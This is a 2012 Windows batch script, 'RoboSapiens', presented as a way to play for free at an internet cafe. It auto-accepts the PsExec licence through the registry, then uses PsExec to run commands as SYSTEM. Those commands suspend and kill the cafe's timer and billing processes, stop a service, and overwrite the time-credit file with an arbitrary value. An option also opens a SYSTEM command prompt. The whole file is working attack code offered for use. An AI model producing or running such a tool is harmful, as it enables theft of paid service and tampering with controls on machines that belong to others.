::|| RoboSapiens V3.0.0
::|| Written by bugos//18-4-2012
::|| Lets you play for free in the local netcafe
::|| %time%: the timer of the guards is set to this values.
::|| 		 if set to k, it kills the guards and exits.
::||         if set to s, it opens a system command promt.
::||taken from %1 (arg1) or from cin

::|| 010.exe is process.exe from http://retired.beyondlogic.org/solutions/processutil/processutil.htm
::|| -k to kill, -s to suspend, -r to resume
::|| 020.exe is PsExec from http://technet.microsoft.com/en-us/sysinternals/bb897553

@echo off
reg.exe ADD "HKCU\Software\Sysinternals\PsExec" /v EulaAccepted /t REG_DWORD /d 1 /f

:start
:://Take input from args if they exist, else from cin
IF "%1"=="" (
	echo hey man! gimme something
	set /p time=
) ELSE (
	set time=%1
)

:://Additional options
IF "%time%"=="s" (start 020 cmd && goto start)
IF "%time%"=="k" (set kill_only=1 %% set time=00:05)

:://Input checking 
    ::(Minor bug with multiple errors, displays last one only)
set "error="
IF not "%time:~2,1%"==":" (set error=colon missing)
IF not "%time:~5,1%"==""  (set error=more than 5 chars)
IF     "%time:~4,1%"==""  (set error=less than 5 chars) 
IF not "%time:~0,1%"=="0" (set error=more than 9 hours)
    ::TODO: if numbers checking
IF defined error (
echo Error! : %error%. Try hh:mm
goto start
)

:://========Main Code========
copy 010.exe c:\
copy 020.exe c:\

:://Kill the guards
c: && cd C:\
echo @echo off>1.bat
echo c: ^&^& cd c:\>>1.bat

echo 010 -s WEBMAIN1.exe>>1.bat
echo 010 -s svhost2.exe>>1.bat
echo net stop svchost3>>1.bat
echo 010 -k WEBMAIN1.exe>>1.bat

IF /i "%kill_only%"=="1" (echo I will just kill then) && goto launch_rocket

:://Edit the time
echo d:>>1.bat
echo cd D:\WEBMAIN>>1.bat
echo echo %time%:00^>WEBMAIN1.CRD>>1.bat


:://Respawn the guards
echo c:>>1.bat
echo start "title" "C:\WEBMAIn\WEBMAIN1.exe">>1.bat


:launch_rocket
if "%errorlevel%"=="1" (echo ERROR!!!, %errorlevel% && pause) 
020.exe -i -d -s C:\1.bat
